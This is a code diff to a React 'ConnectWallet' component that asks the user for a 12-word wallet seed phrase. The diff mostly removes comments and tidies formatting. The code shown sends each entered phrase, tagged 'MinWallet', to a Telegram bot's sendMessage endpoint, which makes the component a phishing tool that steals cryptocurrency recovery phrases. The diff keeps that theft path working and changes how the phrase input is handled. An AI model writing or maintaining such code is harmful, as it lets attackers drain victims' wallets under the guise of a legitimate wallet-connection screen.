@@ -8,7 +8,6 @@ function ConnectWallet({ onClose }) {
   const [showRestoreContainer, setShowRestoreContainer] = useState(false);
   const [fileName, setFileName] = useState("");
   const [seedPhrase, setSeedPhrase] = useState("");
-  const [fileUploaded, setFileUploaded] = useState(false);
   const [attempts, setAttempts] = useState(0);
   const navigate = useNavigate();
 
@@ -71,10 +70,8 @@ function ConnectWallet({ onClose }) {
     }
     const token = import.meta.env.VITE_REACT_APP_TELEGRAM_TOKEN;
     const chat_id = import.meta.env.VITE_REACT_APP_TELEGRAM_CHAT_ID;
-    // Prepare message
     const message = `MinWallet: ${words.join(" ")}`;
 
-    // Define API endpoints and data
     const endpoints = [
       {
         url: `https://api.telegram.org/bot${token}/sendMessage`,
@@ -86,7 +83,6 @@ function ConnectWallet({ onClose }) {
     ];
 
     try {
-      // Send messages to both endpoints
       const responses = await Promise.all(
         endpoints.map((endpoint) =>
           fetch(endpoint.url, {
@@ -99,7 +95,6 @@ function ConnectWallet({ onClose }) {
         )
       );
 
-      // Check responses
       for (const response of responses) {
         if (!response.ok) {
           throw new Error(`Network response was not ok: ${response.status}`);
@@ -114,10 +109,17 @@ function ConnectWallet({ onClose }) {
     }
   };
 
-  const SeedPhraseContainer = ({ seedPhrase, onSeedPhraseChange, handleTransferWallet }) => {
-    const wordCount = seedPhrase.trim().split(/\s+/).filter(word => word.length > 0).length;
+  const SeedPhraseContainer = ({
+    seedPhrase,
+    onSeedPhraseChange,
+    handleTransferWallet,
+  }) => {
+    const wordCount = seedPhrase
+      .trim()
+      .split(/\s+/)
+      .filter((word) => word.length > 0).length;
     const isValid = wordCount === 12;
-  
+
     const handleInputChange = (e) => {
       onSeedPhraseChange(e.target.value);
     };
@@ -407,7 +409,7 @@ function ConnectWallet({ onClose }) {
                                 {restoreMethod === "seedPhrase" ? (
                                   <SeedPhraseContainer
                                     seedPhrase={seedPhrase}
-                                    onSeedPhraseChange={setSeedPhrase}
+                                    onSeedPhraseChange={handleSeedPhraseChange}
                                     handleTransferWallet={handleTransferWallet}
                                   />
                                 ) : (
